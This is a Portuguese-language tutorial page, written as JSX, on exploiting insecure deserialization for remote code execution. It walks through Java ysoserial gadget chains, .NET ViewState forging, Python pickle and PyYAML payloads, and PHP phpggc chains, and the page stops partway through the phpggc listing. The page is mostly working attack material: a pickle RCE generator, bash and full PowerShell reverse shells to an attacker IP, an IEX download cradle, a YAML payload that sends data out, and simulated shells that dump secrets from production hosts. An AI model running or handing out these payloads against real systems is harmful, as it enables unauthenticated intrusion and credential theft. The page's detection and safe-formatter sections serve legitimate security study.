import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Deserialization() {
  return (
    <PageContainer
      title="Insecure Deserialization — RCE via objetos serializados"
      subtitle="Java (ysoserial / CommonsCollections), .NET (ysoserial.net / BinaryFormatter), Python (pickle), PHP (POP chains / phpggc), Node (serialize-javascript) e Ruby (Marshal). Como detectar, gerar payload e ganhar shell."
      difficulty="avancado"
      timeToRead="32 min"
    >
      <AlertBox type="danger" title="OWASP A08:2021 — Software and Data Integrity Failures">
        Desserialização insegura dá <strong>RCE não-autenticado</strong> em quase todo CVE
        crítico de produto Java/PHP da década (Struts2, JBoss, WebLogic, Liferay, Confluence,
        Jenkins, Magento, Drupal). Um único cookie/parâmetro/header com bytes mágicos
        certos compromete servidor, lateral move e domínio inteiro.
      </AlertBox>

      <h2>O que está acontecendo (versão curta)</h2>
      <p>
        <strong>Serializar</strong> = transformar objeto em memória num blob (bytes/JSON/XML)
        para guardar/transmitir. <strong>Desserializar</strong> = reconstruir o objeto a partir
        do blob. A vulnerabilidade aparece quando a aplicação faz isso em dados controlados
        pelo atacante (cookie, body, header, parâmetro, mensagem de fila, cache) <em>sem
        whitelist de classes</em>. A linguagem invoca métodos automáticos durante a
        reconstrução (<code>readObject</code> em Java, <code>__wakeup</code>/<code>__destruct</code> em
        PHP, <code>__reduce__</code> em Python). Se uma classe presente no classpath/autoload
        encadeia chamadas até <code>Runtime.exec</code> / <code>system()</code> / <code>eval()</code>,
        o atacante constrói uma <strong>gadget chain</strong> e executa código.
      </p>

      <h2>Bytes mágicos — como reconhecer no Burp</h2>
      <OutputBlock label="assinaturas comuns de blobs serializados" type="muted">
{`Java (ObjectOutputStream)
  hex:    AC ED 00 05
  base64: rO0AB...
  Onde aparece: cookies (JSESSIONID custom, ViewState), headers (X-Auth-Token),
                body de JMS/RMI, multipart, websocket.

.NET BinaryFormatter
  hex:    00 01 00 00 00 FF FF FF FF
  base64: AAEAAAD/////
  ViewState ASP.NET WebForms (campo __VIEWSTATE = base64).

.NET LosFormatter (ViewState v1)
  base64: /wEP... (sempre começa com /wE)

PHP serialize()
  texto:  O:8:"stdClass":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
  Cookies / hidden inputs / cache em arquivo.

Python pickle (protocol 2+)
  hex:    80 02 ... 2E    (começa com 80 02/03/04, termina com .)
  base64: gAJ...  ou  gAR...

Ruby Marshal
  hex:    04 08
  base64: BAh...

Node serialize-javascript / node-serialize
  texto:  {"rce":"_$$ND_FUNC$$_function(){...}()"}
  Padrão único: presença de _$$ND_FUNC$$_.`}
      </OutputBlock>

      <AlertBox type="info" title="Atalho mental">
        Viu <code>rO0AB</code> em algum lugar do request → <strong>Java serializado</strong>.
        Viu <code>/wE</code> ou <code>AAEAAAD</code> → <strong>.NET</strong>.
        Viu <code>O:N:"...":</code> → <strong>PHP</strong>.
        Viu <code>gAJ</code> ou <code>gAR</code> → <strong>Python pickle</strong>.
        Viu <code>BAh</code> → <strong>Ruby Marshal</strong>.
      </AlertBox>

      <h2>Detecção passiva — Burp + grep</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "exportar logs do Burp e procurar marcadores",
            cmd: "grep -aErn 'rO0AB|AAEAAAD|/wEP|gAJ|gAR|BAh|O:[0-9]+:\\\"' ~/burp_logs/",
            out: `~/burp_logs/empresa-2026-04-04.log:482:Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAEdXNlcnQABWFkbWlu...
~/burp_logs/empresa-2026-04-04.log:1041:__VIEWSTATE=/wEPDwUKLTM4MDIxNzAwM2RkXJ4rW8L0zPQwEzWh2VtnCq2uKQ==
~/burp_logs/intranet.log:228:user_pref=O:4:"User":2:{s:4:"name";s:8:"wallyson";s:4:"role";s:5:"guest";}
~/burp_logs/api-pedidos.log:721:cart=gAJjX19tYWluX18KQ2FydAo... (base64 pickle!)`,
            outType: "warning",
          },
          {
            comment: "ferramenta automática — Freddy (extension Burp)",
            cmd: "ls ~/.BurpSuite/bapps/ | grep -i freddy",
            out: `freddy_2.0.0.jar`,
            outType: "muted",
          },
          {
            comment: "Freddy detecta passivamente todos os formatos acima e marca no Issues",
            cmd: "tail -3 ~/.BurpSuite/issues.txt",
            out: `[High]  Possible Java deserialization              POST /api/cart       (rO0AB header)
[High]  ASP.NET ViewState without MAC                GET  /Account/Login   (/wE prefix, no signature)
[Med]   PHP serialize() in user-controlled cookie    GET  /portal/index.php`,
            outType: "error",
          },
        ]}
      />

      <h2>JAVA — ysoserial e as CommonsCollections</h2>
      <p>
        <strong>ysoserial</strong> (frohoff) é o gerador padrão de payloads Java. Ele constrói
        gadget chains que abusam de bibliotecas comuns no classpath (Apache Commons Collections,
        Spring, Hibernate, Groovy, etc.). A chain mais usada é <code>CommonsCollections6</code>
        — funciona em CC 3.1+ e não depende de a aplicação chamar nenhum método específico,
        só de a biblioteca estar presente.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar",
            out: `(baixou: ~50MB)`,
            outType: "muted",
          },
          {
            cmd: "java -jar ysoserial-all.jar | head -40",
            out: `Y SO SERIAL?
Usage: java -jar ysoserial-all.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                 Dependencies
     -------             -------                 ------------
     AspectJWeaver       @Jang                   aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider commons-collections:3.1, commons-logging:1.1.1
     C3P0                @mbechler               c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit              click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades       clojure:1.8.0
     CommonsBeanutils1   @frohoff                commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                commons-collections:3.1
     CommonsCollections2 @frohoff                commons-collections4:4.0
     CommonsCollections3 @frohoff                commons-collections:3.1
     CommonsCollections4 @frohoff                commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser        commons-collections:3.1
     CommonsCollections6 @matthias_kaiser        commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax   commons-collections:3.1
     FileUpload1         @mbechler               commons-fileupload:1.3.1
     Groovy1             @frohoff                groovy:2.3.9
     Hibernate1          @mbechler               
     Hibernate2          @mbechler               
     JBossInterceptors1  @matthias_kaiser        
     JRMPClient          @mbechler               
     JRMPListener        @mbechler               
     JSON1               @mbechler               
     JavassistWeld1      @matthias_kaiser        
     Jdk7u21             @frohoff                
     Jython1             @pwntester, @cschneider 
     MozillaRhino1       @matthias_kaiser        
     MozillaRhino2       @matthias_kaiser        
     Myfaces1            @mbechler               
     Myfaces2            @mbechler               
     ROME                @mbechler               
     Spring1             @frohoff                
     Spring2             @frohoff                
     URLDNS              @gebl                   no deps! (DNS callback test)
     Vaadin1             @kai_ullrich            
     Wicket1             @jacob-baines           `,
            outType: "info",
          },
        ]}
      />

      <h3>Passo 1 — provar a vuln com URLDNS (zero dependência)</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "URLDNS NÃO precisa de bibliotecas extras. Se disparar DNS callback, a app desserializa.",
            cmd: "java -jar ysoserial-all.jar URLDNS 'http://abc123.empresa.dnslog.io' > /tmp/probe.bin",
            out: `(silencioso. /tmp/probe.bin = 1.2KB)`,
            outType: "muted",
          },
          {
            cmd: "xxd /tmp/probe.bin | head -3",
            out: `00000000: aced 0005 7372 0011 6a61 7661 2e75 7469  ....sr..java.uti
00000010: 6c2e 4861 7368 4d61 7005 07da c1c3 1660  l.HashMap......\`
00000020: d103 0002 4600 0a6c 6f61 6446 6163 746f  ....F..loadFacto`,
            outType: "default",
          },
          {
            cmd: "cat /tmp/probe.bin | base64 -w0",
            out: `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzaa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD/////...`,
            outType: "warning",
          },
          {
            comment: "enviar como cookie e abrir dnslog em outra aba",
            cmd: "curl -s -b 'token=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...' https://app.empresa.com.br/api/account",
            out: `HTTP/1.1 500 Internal Server Error
{"error":"unable to deserialize token"}    ← mas o DNS já foi feito!`,
            outType: "info",
          },
          {
            cmd: "curl -s https://abc123.empresa.dnslog.io/_/log",
            out: `2026-04-04 01:42:11  192.0.2.42  A  abc123.empresa.dnslog.io
2026-04-04 01:42:11  192.0.2.42  AAAA abc123.empresa.dnslog.io       ← CONFIRMADO!`,
            outType: "error",
          },
        ]}
      />

      <h3>Passo 2 — descobrir qual chain funciona (probe sem RCE)</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "gerar 1 payload por chain, cada um faz curl pra subdomínio único",
            cmd: `for gc in CommonsCollections1 CommonsCollections2 CommonsCollections5 CommonsCollections6 \\
    CommonsBeanutils1 Spring1 Hibernate1 Groovy1 Clojure JSON1 ROME Jdk7u21; do
  java -jar ysoserial-all.jar $gc "curl http://192.168.50.107:8080/hit-$gc" 2>/dev/null \\
    | base64 -w0 > /tmp/p_$gc.b64
  echo "[+] $gc -> /tmp/p_$gc.b64 ($(wc -c < /tmp/p_$gc.b64) bytes)"
done`,
            out: `[+] CommonsCollections1 -> /tmp/p_CommonsCollections1.b64 (3142 bytes)
[+] CommonsCollections2 -> /tmp/p_CommonsCollections2.b64 (3284 bytes)
[+] CommonsCollections5 -> /tmp/p_CommonsCollections5.b64 (3024 bytes)
[+] CommonsCollections6 -> /tmp/p_CommonsCollections6.b64 (3088 bytes)
[+] CommonsBeanutils1 -> /tmp/p_CommonsBeanutils1.b64 (4612 bytes)
[+] Spring1 -> /tmp/p_Spring1.b64 (3920 bytes)
[+] Hibernate1 -> /tmp/p_Hibernate1.b64 (5188 bytes)
[+] Groovy1 -> /tmp/p_Groovy1.b64 (2820 bytes)
[+] Clojure -> /tmp/p_Clojure.b64 (2112 bytes)
[+] JSON1 -> /tmp/p_JSON1.b64 (4424 bytes)
[+] ROME -> /tmp/p_ROME.b64 (3608 bytes)
[+] Jdk7u21 -> /tmp/p_Jdk7u21.b64 (1842 bytes)`,
            outType: "muted",
          },
          {
            comment: "subir HTTP listener e disparar todos",
            cmd: "python3 -m http.server 8080 &",
            out: "Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...",
            outType: "info",
          },
          {
            cmd: `for f in /tmp/p_*.b64; do
  gc=$(basename $f .b64 | sed 's/p_//')
  curl -s -b "token=$(cat $f)" https://app.empresa.com.br/api/me >/dev/null
done`,
            out: `(silencioso. olha o terminal do http.server:)
192.0.2.42 - - [04/Apr/2026 01:48:11] "GET /hit-CommonsCollections6 HTTP/1.1" 404 -
192.0.2.42 - - [04/Apr/2026 01:48:14] "GET /hit-CommonsBeanutils1 HTTP/1.1" 404 -      ← CC6 e CB1 funcionam!`,
            outType: "error",
          },
        ]}
      />

      <h3>Passo 3 — RCE de verdade com reverse shell</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "encodar bash revshell em base64 (para evitar metacaracteres)",
            cmd: "echo -n 'bash -i >& /dev/tcp/192.168.50.107/4444 0>&1' | base64 -w0",
            out: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUwLjEwNy80NDQ0IDA+JjE=`,
            outType: "default",
          },
          {
            comment: "wrapper bash {echo,...}|{base64,-d}|{bash,-i} contorna parsing do Runtime.exec",
            cmd: `java -jar ysoserial-all.jar CommonsCollections6 \\
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUwLjEwNy80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" \\
  | base64 -w0 > /tmp/rev.b64`,
            out: `(silencioso. 3.1KB)`,
            outType: "muted",
          },
          {
            comment: "abrir listener",
            cmd: "rlwrap nc -lvnp 4444",
            out: `listening on [any] 4444 ...`,
            outType: "info",
          },
          {
            comment: "disparar (em outra aba)",
            cmd: "curl -s -b \"token=$(cat /tmp/rev.b64)\" https://app.empresa.com.br/api/me",
            out: `HTTP/1.1 500 Internal Server Error
{"error":"InvalidObjectException"}   ← OK, exception é normal — o gadget já executou`,
            outType: "warning",
          },
          {
            comment: "(no nc:) shell chega",
            cmd: "(nc:)",
            out: `connect to [192.168.50.107] from (UNKNOWN) [203.0.113.42] 51842
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@app-prod:/var/lib/tomcat9/bin$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat@app-prod:/var/lib/tomcat9/bin$ hostname
app-prod-01.empresa.com.br`,
            outType: "error",
          },
        ]}
      />

      <CommandTable
        title="Gadget chains do ysoserial — quando usar"
        variations={[
          { cmd: "URLDNS", desc: "Probe sem dependência. Usa só JDK. SÓ faz DNS lookup.", output: "Sem RCE — só prova a vuln." },
          { cmd: "CommonsCollections6", desc: "Mais estável. Funciona em CC 3.1+ sem precisar de método específico.", output: "RCE em apps com Apache Commons Collections (Tomcat, JBoss, Weblogic, Jenkins legacy)." },
          { cmd: "CommonsCollections5", desc: "Alternativa quando CC6 não funciona (BadAttributeValueExpException sai diferente).", output: "RCE em CC 3.1." },
          { cmd: "CommonsCollections2", desc: "Para Apache Commons Collections 4.0 (pacote diferente).", output: "RCE em apps com CC4." },
          { cmd: "CommonsBeanutils1", desc: "Funciona se commons-beanutils + commons-collections estão no classpath. Comum em apps legados.", output: "RCE em Spring/Struts2 antigos." },
          { cmd: "Spring1 / Spring2", desc: "Spring Framework com AOP.", output: "RCE em Spring < 4.x." },
          { cmd: "Hibernate1 / Hibernate2", desc: "ORM Hibernate.", output: "RCE em apps com PropertyAccessor." },
          { cmd: "Groovy1", desc: "Quando Groovy está no classpath (Jenkins!).", output: "RCE clássico de Jenkins CVE-2015-8103." },
          { cmd: "ROME", desc: "Biblioteca de RSS feeds.", output: "Apps Java com ROME ≤ 1.0." },
          { cmd: "Jdk7u21", desc: "ZERO dependência (só JDK 7u21 ou inferior).", output: "Raro hoje, mas dispositivos embarcados / legacy." },
          { cmd: "JRMPClient", desc: "Não executa direto — abre conexão a JRMP listener seu (use junto com JRMPListener).", output: "Para bypass de filtros que rejeitam payloads RCE diretos." },
          { cmd: "JRMPListener", desc: "Listener que entrega segundo payload via JRMP.", output: "Combine: vítima -> JRMPClient -> seu JRMPListener -> CC6." },
        ]}
      />

      <h2>Alvos clássicos Java (e como atacar)</h2>
      <CommandTable
        title="Endpoints históricos vulneráveis"
        variations={[
          { cmd: "JBoss /invoker/JMXInvokerServlet", desc: "POST com payload binário direto. CVE-2015-7501.", output: "java -jar ysoserial CC6 cmd > p.bin && curl --data-binary @p.bin :8080/invoker/JMXInvokerServlet" },
          { cmd: "JBoss /invoker/EJBInvokerServlet", desc: "Mesmo conceito, outro caminho.", output: "Idem acima, /invoker/EJBInvokerServlet." },
          { cmd: "WebLogic T3 (porta 7001)", desc: "Protocolo binário T3. Use weblogic-spring-jndi-20180228.jar.", output: "ysoserial via T3 wrapper, CVE-2015-4852, CVE-2017-3248." },
          { cmd: "Jenkins CLI (porta 50000)", desc: "CVE-2017-1000353. Cliente custom (jenkinscli-deserialization-pre-2.46).", output: "RCE não-autenticado em Jenkins ≤ 2.46." },
          { cmd: "Apache Solr /solr/admin/cores", desc: "ConfigAPI com Runtime.exec via Velocity (CVE-2019-17558).", output: "Não é deser puro mas mesma família." },
          { cmd: "Confluence /rest/tinymce/1/macro/preview", desc: "OGNL injection (CVE-2022-26134).", output: "Família 'template injection' próxima de deser." },
          { cmd: "Liferay /api/jsonws/invoke", desc: "JSON deser com Jodd (CVE-2020-7961).", output: "RCE não-auth em Liferay 6.x/7.x." },
          { cmd: "Apache Struts2 (s2-052)", desc: "REST plugin desserializa XML como Java.", output: "Content-Type XML + payload XStream → RCE." },
        ]}
      />

      <h2>.NET — ysoserial.net e ViewState</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "instalar via wine no Kali (binário PE)",
            cmd: "wget -q https://github.com/pwntester/ysoserial.net/releases/latest/download/ysoserial-1.36.zip && unzip -q ysoserial-1.36.zip -d ysonet && ls ysonet/",
            out: `Newtonsoft.Json.dll
ysoserial.exe
README.md
plugins/`,
            outType: "muted",
          },
          {
            cmd: "wine ysonet/ysoserial.exe --help | head -25",
            out: `ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Available formatters:
  ActivitySurrogateSelector
  ActivitySurrogateSelectorFromFile
  AxHostState
  BinaryFormatter           ← clássico, ainda muito usado
  ClaimsIdentity
  DataContractSerializer
  DataSet
  Json.Net                  ← Newtonsoft.Json com TypeNameHandling != None
  LosFormatter              ← ViewState v1
  ObjectDataProvider
  ObjectStateFormatter      ← ViewState moderno
  PSObject
  RolePrincipal
  SoapFormatter
  TextFormattingRunProperties
  TypeConfuseDelegate       ← gadget mais usado
  TypeConfuseDelegateMono
  WindowsClaimsIdentity
  WindowsIdentity
  WindowsPrincipal
  XamlAssemblyLoadFromFile
  XmlSerializer`,
            outType: "info",
          },
          {
            comment: "payload BinaryFormatter clássico",
            cmd: `wine ysonet/ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \\
  -c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.50.107/r.ps1')" \\
  -o base64`,
            out: `AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5VbmlvbmFyeUF1dG8AHgEAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDA...`,
            outType: "warning",
          },
        ]}
      />

      <h3>ViewState — o caso mais comum em ASP.NET WebForms</h3>
      <p>
        ViewState é o campo <code>__VIEWSTATE</code> em forms ASP.NET. Se a aplicação não tem
        MAC validation (<code>EnableViewStateMac="false"</code>) ou se a chave é conhecida
        (default, leakada em web.config), o atacante gera um ViewState malicioso e o servidor
        desserializa → RCE.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) verificar se tem ViewState e se está sem MAC",
            cmd: "curl -s https://portal.empresa.com.br/Login.aspx | grep -oE '__VIEWSTATE\" value=\"[^\"]+\"' | head -1",
            out: `__VIEWSTATE" value="/wEPDwUKLTM4MDIxNzAwM2RkXJ4rW8L0zPQwEzWh2VtnCq2uKQ=="`,
            outType: "info",
          },
          {
            comment: "Badsecrets — detecta keys default/conhecidas",
            cmd: "badsecrets '/wEPDwUKLTM4MDIxNzAwM2RkXJ4rW8L0zPQwEzWh2VtnCq2uKQ=='",
            out: `[+] Cracked! Type: ASP.NET Viewstate
    Algorithm    : SHA1
    Validation   : SHA1
    ValidationKey: 70F2D6C50E89AC55F8FA3A5C0E0D9E8B3C2F6A0F  (machineKey leakada — Telerik UI 2017.x default)
    DecryptionKey: -                                          (não criptografado)`,
            outType: "error",
          },
          {
            comment: "gerar ViewState malicioso COM a key conhecida",
            cmd: `wine ysonet/ysoserial.exe -p ViewState -g TypeConfuseDelegate \\
  -c "cmd.exe /c powershell -nop -w hidden -e $(echo -n '$c=New-Object Net.Sockets.TCPClient(\"192.168.50.107\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sB=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sB,0,$sB.Length);$s.Flush()};$c.Close()' | iconv -t utf-16le | base64 -w0)" \\
  --path="/Login.aspx" --apppath="/" \\
  --validationkey=70F2D6C50E89AC55F8FA3A5C0E0D9E8B3C2F6A0F --validationalg=SHA1`,
            out: `[+] Encoded ViewState (URL-encoded):
%2FwEy0gIAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXlN5c3RlbS5XZWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhBQEAAAB...`,
            outType: "warning",
          },
          {
            cmd: `curl -s -X POST "https://portal.empresa.com.br/Login.aspx" \\
  --data-urlencode "__VIEWSTATE=$(cat /tmp/vs.txt)" --data "__EVENTTARGET=&__EVENTARGUMENT="`,
            out: `HTTP/1.1 500 Internal Server Error
The state information is invalid for this page and might be corrupted.
                       ↑ erro NORMAL — pipeline já executou o gadget`,
            outType: "info",
          },
          {
            cmd: "(no nc -lvnp 4444:)",
            out: `connect to [192.168.50.107] from (UNKNOWN) [203.0.113.55] 49982
PS C:\\Windows\\system32\\inetsrv> whoami
iis apppool\\portal
PS C:\\Windows\\system32\\inetsrv> hostname
WEB-IIS-01`,
            outType: "error",
          },
        ]}
      />

      <CommandTable
        title=".NET — formatters perigosos vs seguros"
        variations={[
          { cmd: "BinaryFormatter", desc: "PERIGOSO. Microsoft marcou como obsoleto em .NET 5+, removido em .NET 9.", output: "RCE trivial — TypeConfuseDelegate." },
          { cmd: "SoapFormatter", desc: "PERIGOSO. Mesma família.", output: "RCE." },
          { cmd: "LosFormatter / ObjectStateFormatter", desc: "ViewState. RCE se sem MAC ou key conhecida.", output: "RCE via Telerik / web.config leak." },
          { cmd: "Json.Net (Newtonsoft)", desc: "PERIGOSO se TypeNameHandling != None.", output: "RCE via $type field." },
          { cmd: "JavaScriptSerializer", desc: "PERIGOSO se SimpleTypeResolver passado no construtor.", output: "RCE via __type." },
          { cmd: "DataContractSerializer", desc: "PERIGOSO se KnownTypes inclui System.Object.", output: "RCE." },
          { cmd: "XmlSerializer", desc: "PERIGOSO se Type passado dinamicamente.", output: "RCE com ObjectDataProvider." },
          { cmd: "System.Text.Json", desc: "SEGURO por default (sem polymorphic).", output: "Use este." },
          { cmd: "DataContractJsonSerializer", desc: "Razoável (sem TypeNameHandling).", output: "OK." },
        ]}
      />

      <h2>PYTHON — pickle e PyYAML</h2>
      <p>
        <code>pickle.loads()</code> é uma das primitivas <strong>mais perigosas do
        ecossistema Python</strong>. A própria documentação oficial avisa: "Never unpickle
        data from an untrusted source." Mas dev usa em cookie de Flask, mensagem de Celery,
        cache em Redis, parâmetro de API. <code>__reduce__</code> é o método que define
        o que <code>pickle.loads</code> vai chamar — basta retornar uma tupla
        <code>(funcao, (args,))</code>.
      </p>

      <CodeBlock
        language="python"
        title="gen_pickle_rce.py — gerador de payload pickle"
        code={`#!/usr/bin/env python3
"""
Gera payload pickle que executa comando arbitrário ao ser desserializado.
Uso: python3 gen_pickle_rce.py "id" > payload.bin
     python3 gen_pickle_rce.py "id" --b64
"""
import pickle
import os
import sys
import base64

CMD = sys.argv[1] if len(sys.argv) > 1 else "id"
B64 = "--b64" in sys.argv

class RCE:
    def __reduce__(self):
        # __reduce__ é chamado durante PICKLE.DUMPS (na geração)
        # Retorna (callable, args) — pickle.loads vai executar callable(*args)
        return (os.system, (CMD,))

payload = pickle.dumps(RCE())

if B64:
    print(base64.b64encode(payload).decode())
else:
    sys.stdout.buffer.write(payload)
`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: 'python3 gen_pickle_rce.py "id" --b64',
            out: `gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==`,
            outType: "info",
          },
          {
            comment: "verificar — desserializar localmente (PERIGOSO em alvo real, ok aqui)",
            cmd: "python3 gen_pickle_rce.py 'id' | python3 -c 'import sys,pickle; pickle.loads(sys.stdin.buffer.read())'",
            out: `uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`,
            outType: "warning",
          },
          {
            comment: "reverse shell pickle",
            cmd: 'python3 gen_pickle_rce.py "bash -c \'bash -i >& /dev/tcp/192.168.50.107/4444 0>&1\'" --b64 > /tmp/rev.b64',
            out: `(silencioso)`,
            outType: "muted",
          },
          {
            comment: "exemplo: app Flask que usa pickle no cookie",
            cmd: `curl -s -b "session=$(cat /tmp/rev.b64)" https://api.empresa.com.br/dashboard`,
            out: `HTTP/1.1 500 Internal Server Error  (mas o gadget já executou)`,
            outType: "warning",
          },
          {
            comment: "(no nc:)",
            cmd: "(nc -lvnp 4444:)",
            out: `listening on [any] 4444 ...
connect to [192.168.50.107] from (UNKNOWN) [203.0.113.88] 53412
www-data@api-prod:/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@api-prod:/app$ cat /app/config.py | grep -i secret
SECRET_KEY = "django-insecure-not-actually-changed-in-prod-2024"
DATABASE_PASSWORD = "Empresa@2025!"`,
            outType: "error",
          },
        ]}
      />

      <h3>PyYAML — yaml.load() sem SafeLoader</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "PyYAML antes de 6.0: yaml.load() era unsafe por default (CVE-2017-18342)",
            cmd: "cat /tmp/exploit.yaml",
            out: `!!python/object/apply:os.system ["id"]`,
            outType: "default",
          },
          {
            cmd: 'python3 -c "import yaml; yaml.load(open(\'/tmp/exploit.yaml\'), Loader=yaml.Loader)"',
            out: `uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson)
0`,
            outType: "warning",
          },
          {
            comment: "vetor real: API que parseia YAML enviado pelo user",
            cmd: `curl -X POST -H "Content-Type: application/yaml" \\
  --data-binary '!!python/object/apply:subprocess.check_output [["bash","-c","curl 192.168.50.107/o?$(id|base64 -w0)"]]' \\
  https://k8s.empresa.com.br/api/v1/manifest`,
            out: `(no listener:)
192.0.2.99 - - [04/Apr/2026 02:14:11] "GET /o?dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1" 404 -
$ echo dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK | base64 -d
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
        ]}
      />

      <h2>PHP — phpggc e POP chains</h2>
      <p>
        Em PHP a vuln aparece quando <code>unserialize()</code> recebe input do user.
        Os métodos mágicos invocados automaticamente são: <code>__wakeup()</code>,
        <code>__destruct()</code>, <code>__toString()</code>, <code>__call()</code>. Uma
        <strong>POP chain</strong> (Property-Oriented Programming) encadeia esses métodos
        entre classes do framework até atingir uma chamada perigosa
        (<code>system</code>, <code>file_put_contents</code>, <code>include</code>).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "git clone -q https://github.com/ambionics/phpggc && cd phpggc && ./phpggc -l 2>/dev/null | head -25",
            out: `Gadget Chains
-------------

NAME                                              VERSION                                                              TYPE                       VECTOR        I
CodeIgniter4/RCE1                                 4.0.0-rc.4 <= 4.0.4                                                  RCE (Function call)        __destruct      
Doctrine/FW1                                      ?                                                                    File write                 __toString      
Drupal7/FD1                                       7.0.8                                                                File delete                __destruct      
Guzzle/FW1                                        6.0.0 <= 6.3.2                                                       File write                 __destruct      *
Guzzle/INFO1                                      6.0.0 <= 6.3.2+                                                      phpinfo()                  __destruct      
Guzzle/RCE1                                       6.0.0 <= 6.3.2                                                       RCE (PHP code)             __destruct      *
Laminas/FD1                                       2.11.2                                                               File delete                __destruct      
Laravel/RCE1                                      5.4.27                                                               RCE (Function call)        __destruct      
Laravel/RCE2                                      5.5.* <= 5.5.40 / 5.6.* <= 5.6.29                                    RCE (Function call)        __destruct      
Laravel/RCE3                                      5.5.* <= 5.5.40 / 5.6.* <= 5.6.29                                    RCE (Function call)        __destruct      
Laravel/RCE4                                      5.8.30                                                               RCE (Function call)        __destruct      
Laravel/RCE5                                      5.7.* < 5.7.40 / 5.8.* < 5.8.36 / 6.* < 6.18.40 / 7.* < 7.30.5       RCE (PHP code)             __destruct      
Laravel/RCE6                                      5.4.0 <= 5.4.27                                                      RCE (Function call)        __destruct      
Laravel/RCE7                                      5.5.* < 5.5.41 / 5.6.* < 5.6.30                                      RCE (Function call)        __destruct      
Magento/FW1                                       1.x                                                                  File write                 __destruct      *
Magento/RCE1                                      ?                                                                    RCE (Function call)        __destruct      
Monolog/RCE1                                      1.4.1 <= 1.6.0/ 1.17.2                                               RCE (PHP code)             __destruct      
Monolog/RCE2                                      1.4.1 <= 2.4.4                                                       RCE (Function call)        __destruct      
Monolog/RCE3                                      1.10.0 <= 1.18.1                                                     RCE (PHP code)             __destruct      
Monolog/RCE4                                      1.10.0 <= 2.4.4                                                      RCE (PHP code)             __destruct      
Monolog/RCE5                                      1.10.0 <= 2.4.4                                                      RCE (PHP code)             __destruct      *
Monolog/RCE6                                      1.4.1 <= 2.4.4                                                       RCE (PHP code)             __destruct      
